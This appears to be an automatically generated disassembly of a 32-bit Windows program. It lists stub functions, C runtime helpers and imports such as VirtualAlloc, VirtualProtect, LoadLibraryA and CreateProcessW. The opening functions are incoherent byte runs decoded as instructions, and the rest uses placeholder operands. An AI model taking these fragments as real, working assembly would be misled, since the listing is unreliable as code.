sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4029e1
jmp [ 0x70246c83 ]
jl 0xffffffffebc13156
sub_4029ce
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4029e1
jmp [ 0x70246c83 ]
jl 0xffffffffebc13156
sub_402a0a
push ebp
push edx
push edi
push ebx
call sub_402a19
jne 0xffffffffa3a5108c
sub_402a3d
jmp [ esp + 0xa8 ]
sub_402a91
jmp [ esp + 0x2c ]
sub_402c37
add esp 0x68
retn
sub_402deb
push ebx
push esp
push eax
push esp
push edx
call sub_402ef7
jae 0xffffffffccc33d53
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_403465
add esp 0x80
retn
sub_4036bf
push ebp
pushfd
push edi
pushfd
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_40371c
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
sub_4037b2
push ebx
sub esp 0x14
call sub_4037c0
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13f48
sub_4037c0
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13f48
sub_4037fc
push ebp
push edx
push edi
push ebx
call sub_40380b
jne 0xffffffffa3a51e7e
sub_40382f
jmp [ esp + 0xa8 ]
sub_403883
jmp [ esp + 0x2c ]
sub_403a63
add esp 0x68
retn
sub_403d31
push ebx
push esp
push eax
push esp
push edx
call sub_403e3d
jae 0xffffffffccc34c99
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_4043ab
add esp 0x80
retn
sub_404605
push ebp
pushfd
push edi
pushfd
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_404662
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
sub_4046f8
push ebx
sub esp 0x14
call sub_404706
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_404719
jmp [ 0x70246c83 ]
jl 0xffffffffebc14e8e
sub_404706
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_404719
jmp [ 0x70246c83 ]
jl 0xffffffffebc14e8e
sub_404742
push ebp
push edx
push edi
push ebx
call sub_404751
jne 0xffffffffa3a52dc4
sub_404775
jmp [ esp + 0xa8 ]
sub_4047c9
jmp [ esp + 0x2c ]
sub_40498a
add esp 0x68
retn
sub_404a10
push ebp
mov ebp esp
pop ebp
jmp sub_40dfba
sub_404a50
mov eax ecx
retn
sub_404a60
retn
sub_404e20
mov eax ecx
retn
sub_404e30
retn
j_sub_404e30
jmp sub_404e30
sub_408f06
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
sub_40b852
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
Sleep
jmp [ Sleep@IAT ]
lstrcpynW
jmp [ lstrcpynW@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
lstrcmpiW
jmp [ lstrcmpiW@IAT ]
lstrcatW
jmp [ lstrcatW@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
CreateProcessW
jmp [ CreateProcessW@IAT ]
MessageBoxW
jmp [ MessageBoxW@IAT ]
GetMessageW
jmp [ GetMessageW@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DefWindowProcW
jmp [ DefWindowProcW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExW
jmp [ RegisterClassExW@IAT ]
CreateWindowExW
jmp [ CreateWindowExW@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
MoveWindow
jmp [ MoveWindow@IAT ]
DialogBoxParamW
jmp [ DialogBoxParamW@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
GetDC
jmp [ GetDC@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
AdjustWindowRect
jmp [ AdjustWindowRect@IAT ]
SetCursor
jmp [ SetCursor@IAT ]
IntersectRect
jmp [ IntersectRect@IAT ]
LoadCursorW
jmp [ LoadCursorW@IAT ]
LoadIconW
jmp [ LoadIconW@IAT ]
LoadStringW
jmp [ LoadStringW@IAT ]
BitBlt
jmp [ BitBlt@IAT ]
CreateCompatibleBitmap
jmp [ CreateCompatibleBitmap@IAT ]
CreateCompatibleDC
jmp [ CreateCompatibleDC@IAT ]
DeleteDC
jmp [ DeleteDC@IAT ]
DeleteObject
jmp [ DeleteObject@IAT ]
SelectObject
jmp [ SelectObject@IAT ]
CreatePen
jmp [ CreatePen@IAT ]
LineTo
jmp [ LineTo@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
SHGetSpecialFolderPathW
jmp [ SHGetSpecialFolderPathW@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
sub_40c397
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call j_sub_42d0aa
pop ecx
pop ebp
retn
sub_40c3a5
push ebp
mov ebp esp
pop ebp
jmp sub_40c364
sub_40c5df
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_4298ec
pop ecx
pop ecx
retn
sub_40c622
call sub_40cf8f
push eax
call sub_42a4d0
pop ecx
retn
sub_40c62f
push 0x2
pop eax
retn
j_sub_42a59c
jmp j_sub_42a59c#2
sub_40c638
call sub_40d133
movzx eax ax
push eax
call sub_42ae04
push eax
push 0x0
push __dos_header
call sub_4061d0
retn
_start
call sub_40cef0
jmp sub_40c4ac
sub_40c65e
push ebp
mov ebp esp
and [ ecx + 0x4 ] 0x0
and [ ecx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x4
sub_40c67b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c6e1
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c696
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40c6ae
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c6e1
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c6c9
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40c70d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
and [ ecx + 0x4 ] 0x0
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_40c72a
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e6f4
pop ecx
retn
sub_40c73b
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e6f4
pop ecx
retn
sub_40c74c
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e6f4
pop ecx
retn
sub_40c7db
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40c696
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40e713
int3
sub_40c7f8
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40c6c9
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40e713
int3
j_sub_42d0aa
jmp j_sub_42d0aa#3
sub_40c827
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_40c94a
push ebp
mov ebp esp
push 0x8
call sub_40c956
pop ebp
retn
sub_40cb3c
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_40cb6d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
ror eax cl
pop ebp
retn
sub_40cbf1
mov eax [ fs : 0x18 ]
retn
sub_40cc21
call sub_40d45c
test eax eax
je r-xdata
call j_sub_42a59c#2
call sub_40d2e2
jmp r-xdata
mov al 0x1
retn
sub_40cc39
push 0x0
call sub_40cd0f
test al al
pop ecx
setne al
retn
sub_40cc47
call sub_40e7af
test al al
jne r-xdata
call sub_42ce53
test al al
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_40e7ba
jmp r-xdata
sub_40cc66
call sub_42ce5e
call sub_40e7ba
mov al 0x1
retn
sub_40cca6
call sub_40d45c
test eax eax
je r-xdata
call sub_417146
test eax eax
je sub_417121
push rw-data
call sub_42ca8c
pop ecx
retn
retn
sub_40ccc9
push 0x0
call sub_42ce78
pop ecx
jmp sub_40e7e9
sub_40ce0e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_40ce33
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
mov ecx rw-data
xchg [ ecx ] eax
sub_40cedb
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40ce6f
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_40cf8c
xor eax eax
retn
sub_40cf8f
xor eax eax
inc eax
retn
sub_40cf93
xor eax eax
retn
sub_40cf96
mov eax 0x4000
retn
sub_40cf9c
xor eax eax
retn
sub_40cf9f
xor eax eax
retn
sub_40cfa2
push rw-data
call [ InitializeSListHead@IAT ]
retn
sub_40cfae
push rw-data
call sub_40e944
pop ecx
retn
sub_40cfba
push 0x30000
push 0x10000
push 0x0
call sub_42ce8a
add esp 0xc
test eax eax
jne r-xdata
push 0x7
call sub_40d018
int3
retn
sub_40cfdb
retn
sub_40cfdc
retn
sub_40cfdd
mov eax rw-data
retn
sub_40cfe3
call sub_4019d0
mov ecx [ eax + 0x4 ]
or [ eax ] 0x4
mov [ eax + 0x4 ] ecx
call sub_40cfdd
mov ecx [ eax + 0x4 ]
or [ eax ] 0x2
mov [ eax + 0x4 ] ecx
retn
sub_40d000
xor eax eax
cmp [ rw-data ] eax
sete al
retn
sub_40d00c
mov eax rw-data
retn
sub_40d012
mov eax rw-data
retn
sub_40d166
xor eax eax
retn
sub_40d1ad
push sub_40d1b9
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40d2a6
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_40d2bb
mov [ ecx ] r--data
retn
sub_40d45c
xor eax eax
cmp [ rw-data ] eax
setne al
retn
sub_40d468
retn
sub_40d469
xor eax eax
retn
sub_40e2de
retn
sub_40e319
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
pop ebp
retn
sub_40e334
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_40e480
xor eax eax
push eax
push eax
push eax
push rw-data
call sub_401000
add esp 0x10
retn
sub_40e493
push rw-data
call sub_401088
pop ecx
retn
sub_40e63a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call j_sub_42d0aa#3
pop ecx
pop ebp
retn 0x4
sub_40e64a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e658
push esi
mov esi ecx
push [ esi ]
call j_sub_42d0aa#3
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e668
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e670
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40e676
mov eax [ ecx ]
retn
sub_40e679
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e681
push esi
mov esi ecx
push [ esi ]
call j_sub_42d0aa#3
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e7af
call sub_40eb29
test eax eax
setne al
retn
sub_40e7ba
push 0x0
call sub_40eae5
pop ecx
mov al 0x1
retn
sub_40e7e9
call sub_40ebd4
mov al 0x1
retn
sub_40e7f1
retn
j_sub_42d0aa#2
jmp sub_42d0aa
sub_40e7f7
push ebp
mov ebp esp
pop ebp
jmp sub_42d0e4
sub_40e800
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_40e810
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_40e820
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40e832
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40e844
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40e854
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e862
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e870
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e880
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e890
mov eax j_sub_42d0aa#2
retn
sub_40e896
mov eax sub_40e7f7
retn
sub_40e89c
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8a4
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8ac
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_40e8bc
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0e4
pop ecx
pop ebp
retn 0x4
sub_40e8cc
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40e8d2
mov eax [ ecx ]
retn
sub_40e8d5
mov eax [ ecx ]
retn
sub_40e8d8
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8e0
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8e8
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e8f8
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40ea58
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_40ea68
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40ea76
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40ea86
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40ea8e
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40ea94
mov eax [ ecx ]
retn
sub_40ea97
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40ea9f
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40eaaf
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_4103b4
test eax eax
pop ecx
pop ecx
setne al
pop ebp
retn
sub_40eac9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
cmp eax rw-data
je r-xdata
push eax
call sub_42d0aa
pop ecx
sub_40ebd4
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_410340
or [ rw-data ] 0xffffffff
pop ecx
sub_40ec9c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40eca5
mov esp [ ebp - 0x18 ]
call sub_42cf31
sub_40ecd0
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c6e1
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40eceb
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40ed03
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e6f4
pop ecx
retn
sub_40ede6
push [ ebp - 0x14 ]
call sub_40efcd
pop ecx
retn
sub_40ef18
push 0x4
mov eax sub_44ceea
call sub_4496a3
call sub_40eb1b
cmp [ eax + 0x1c ] 0x0
jne r-xdata
call sub_42cf31
and [ ebp - 0x4 ] 0x0
call sub_4167eb
sub_40f56b
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f572
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f579
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f580
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f58c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f598
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f5a4
lea eax [ ecx + 0x8 ]
retn
sub_40f5a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40f65f
xor eax eax
inc eax
retn
sub_40f663
mov esp [ ebp - 0x18 ]
call sub_42cf31
sub_40f78a
xor eax eax
inc eax
retn
sub_40f935
push 0x10
pop eax
retn
sub_40fba2
push [ ebp - 0x14 ]
call sub_40fae7
pop ecx
retn
sub_40fbe0
call sub_40eb1b
cmp [ eax + 0x18 ] 0x0
jle r-xdata
retn
call sub_40eb1b
dec [ eax + 0x18 ]
sub_40fdcc
call sub_40eb1b
add eax 0x10
retn
sub_40fdd5
call sub_40eb1b
add eax 0x14
retn
sub_40fdde
call sub_40eb1b
add eax 0x18
retn
j_sub_42cf31
jmp sub_42cf31
sub_40fea7
retn
sub_40fea8
retn
sub_40fea9
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_40fec1
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_40fed5
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_40fef2
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40ff04
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40ff16
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff23
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff3d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40ff4d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40ff5d
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_40ff68
or eax 0xffffffff
retn
sub_40ff6c
push r--data
push r--data
push r--data
push 0x0
call sub_410078
add esp 0x10
retn
sub_40ff86
push r--data
push r--data
push r--data
push 0x1
call sub_410078
add esp 0x10
retn
sub_40ffa0
push r--data
push r--data
push r--data
push 0x2
call sub_410078
add esp 0x10
retn
sub_40ffba
push r--data
push r--data
push r--data
push 0x3
call sub_410078
add esp 0x10
retn
sub_40ffd4
push r--data
push r--data
push r--data
push 0x4
call sub_410078
add esp 0x10
retn
sub_40ffee
push r--data
push r--data
push r--data
push 0x5
call sub_410078
add esp 0x10
retn
sub_410008
push r--data
push r--data
push r--data
push 0x6
call sub_410078
add esp 0x10
retn
sub_410022
push r--data
push r--data
push r--data
push 0x7
call sub_410078
add esp 0x10
retn
sub_41003c
push r--data
push r--data
push r--data
push 0x8
call sub_410078
add esp 0x10
retn
sub_4105a5
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_416785
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4105d7
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_410490
add esp 0xc
pop ebp
retn 0x8
sub_41062a
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_41066e
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_410683
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_41069b
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_4106b8
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_4106d5
and [ ecx ] 0x0
mov eax ecx
retn
sub_410794
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4108a0
and [ ecx ] 0x0
mov eax ecx
mov [ ecx + 0x4 ] 0x0
and [ ecx + 0x4 ] 0xffff00ff
retn
sub_4109b1
mov [ ecx ] r--data
mov eax ecx
retn
sub_4109dd
or [ ecx ] 0xffffffff
mov eax ecx
retn
sub_410a4c
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x4 ] al
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x4
sub_410a89
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0xc ] 0xffffffff
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x8
sub_410b01
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx rw-data
push [ ebp + 0x8 ]
call sub_413d8f
pop ebp
retn
sub_410b16
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4110d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
pop ebp
retn 0x8
sub_411eaf
mov eax [ rw-data ]
shr eax 0x7
not eax
and eax 0x1
retn
sub_411ebd
mov eax [ rw-data ]
shr eax 0x4
not eax
and eax 0x1
retn
sub_411ecb
mov eax [ rw-data ]
shr eax 0x3
not eax
and eax 0x1
retn
sub_411ed9
mov eax [ rw-data ]
shr eax 0xf
not eax
and eax 0x1
retn
sub_411ee7
mov eax [ rw-data ]
shr eax 0x12
not eax
and eax 0x1
retn
sub_411ef5
mov eax [ rw-data ]
shr eax 0x2
not eax
and eax 0x1
retn
sub_411f03
mov eax [ rw-data ]
shr eax 0x1
not eax
and eax 0x1
retn
sub_411f10
mov eax [ rw-data ]
shr eax 0x9
not eax
and eax 0x1
retn
sub_411f1e
mov eax [ rw-data ]
and eax 0x1000
retn
sub_411f29
mov eax [ rw-data ]
and eax 0x10000
retn
sub_411fbe
mov eax [ rw-data ]
shr eax 0x11
not eax
and eax 0x1
retn
sub_411fcc
mov eax [ rw-data ]
shr eax 0x13
not eax
and eax 0x1
retn
sub_411fda
mov ecx [ rw-data ]
xor eax eax
and ecx 0x60
cmp cl 0x60
setne al
retn
sub_411fec
mov eax [ rw-data ]
shr eax 0x8
not eax
and eax 0x1
retn
sub_411ffa
mov eax [ rw-data ]
and eax 0x2000
retn
sub_412005
mov eax [ rw-data ]
not eax
and eax 0x1
retn
sub_41287d
add al [ ebx ]
add eax [ 0xffffffffec8b5504 ]
push 0x0
push [ ebp + 0x8 ]
call sub_4132d1
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_413463
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_4132d1
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_413594
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_414dd4
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_413cbc
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4132d1
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_413cef
cmp [ ecx + 0x4 ] 0x1
setne al
dec al
and al 0x20
retn
sub_413cfb
mov al [ ecx + 0x4 ]
retn
sub_413cff
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne sub_413cd0
xor al al
retn
sub_413d40
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
xor al al
retn
mov eax [ ecx + 0x4 ]
mov al [ eax + edx - 0x1 ]
retn
sub_4144a4
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4147bd
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4144c2
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4147bd
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4148b9
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4147bd
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_414f22
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_412f77
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_414fdc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop ebp
retn 0x8
mov cl [ ecx + 0x4 ]
mov [ eax ] cl
inc eax
sub_414ff1
push ebp
mov ebp esp
